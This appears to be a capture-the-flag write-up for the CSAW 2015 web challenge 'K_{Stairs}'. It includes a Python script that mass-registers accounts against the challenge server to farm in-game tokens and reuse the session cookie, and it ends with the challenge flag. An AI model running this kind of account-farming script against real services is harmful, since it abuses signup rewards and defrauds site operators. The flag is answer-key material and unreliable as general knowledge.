---
layout: post
title:  "CSAW - K_{Stairs}"
date:   2015-09-21 19:00
categories: csaw2015
tags: security ctf csaw2015 cryptography
description: A web challenge for 100 points
---

**Category** : Web 

**Points** : 100

**Contributor** : [Marc Olivier Bergeron](https://github.com/MOBergeron)

***

#Write-up
At the start of the CTF, this challenge was worth 50 points, but they changed it for 100 points. We realized that when you register/logout you get three more tokens each time. In that challenge, we needed 10 tokens to buy a compass and one token for a pack of five food item.

My partner created a Python script that created many accounts. Then, it returned the cookie that we could replace with our current one. So, with that script you did not need to manually create an account to have more tokens.

###Script by [MOBergeron](https://gist.github.com/MOBergeron/a34e719e4587257defab)
{% highlight python %}
import hashlib
import requests

if __name__ == "__main__":
	u = 199999 # Change this everytime you run the script to have different user names
	
	urlRegister = "http://54.209.88.227/register"
	urlLogout = "http://54.209.88.227/logout"

	s = requests.session()
	
	for i in range(50): # Change this if you need more or less tokens
		username = hashlib.sha1(str(u)).hexdigest()
		user1 = username[:len(username)/2]
		user2 = username[len(username)/2:]
		# Login 1
		r = s.post(urlRegister, data={'user':user1,'pass':'','login':'register'})
		s.get(urlLogout)

		# Login 2
		r = s.post(urlRegister, data={'user':user2,'pass':'','login':'register'})
		
		if(i < 49):
			s.get(urlLogout)
		u+=1

	print(r.cookies)
{% endhighlight %}

Then, we just needed to buy a compass, foods and follow the compass indication to find the stairs.

And when we reached the stairs we got this message:

“Your compass indicates you are going the right way. You found the exit... You win! You find the key on a piece of paper: KEY{H0000LY_ST41rRs_S0000_MUCH_SPACE}. Then a grue gets you. You die.”



